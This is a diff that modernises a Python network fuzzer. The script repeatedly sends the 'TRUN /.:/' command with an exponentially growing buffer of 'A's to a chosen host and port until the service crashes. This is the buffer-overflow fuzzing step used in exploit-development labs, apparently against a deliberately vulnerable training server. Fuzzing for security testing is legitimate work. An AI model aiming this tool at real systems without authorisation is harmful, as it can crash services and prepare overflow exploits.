@@ -1,18 +1,36 @@
-#!/usr/bin/python
-import sys, socket
-from time import sleep
+#!/usr/bin/python3
 
-buffer = "A" * 100
+import sys
+import socket
+import time
+import argparse
+import logging
 
-while True:
-	try:
-		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		s.connect(('192.168.1.1','9999'))
-		s.send(('TRUN /.:/' + buffer))
-		s.close()
-		sleep(1)
-		buffer = buffer + "A" * 100
-	except Exception as e:
-		print "Fuzzing crashed at %s bytes" % (str(len(buffer)))
-		sys.exit()
-		raise e
+# Configure logging
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+
+def fuzz_target(ip, port):
+    buffer_size = 100
+    while True:
+        try:
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                s.connect((ip, port))
+                payload = f'TRUN /.:/{buffer_size * "A"}'
+                logging.info(f'Sending buffer size: {len(payload)}')
+                s.sendall(payload.encode())
+            time.sleep(1)
+            buffer_size *= 2  # Exponential increase in buffer size
+        except ConnectionRefusedError:
+            logging.error('Connection to target refused. Exiting.')
+            sys.exit(1)
+        except Exception as e:
+            logging.error(f'Fuzzing crashed at {buffer_size} bytes: {e}')
+            sys.exit(1)
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser(description='Simple fuzzer for testing server robustness')
+    parser.add_argument('--ip', required=True, help='Target IP address')
+    parser.add_argument('--port', type=int, required=True, help='Target port number')
+    args = parser.parse_args()
+
+    fuzz_target(args.ip, args.port)
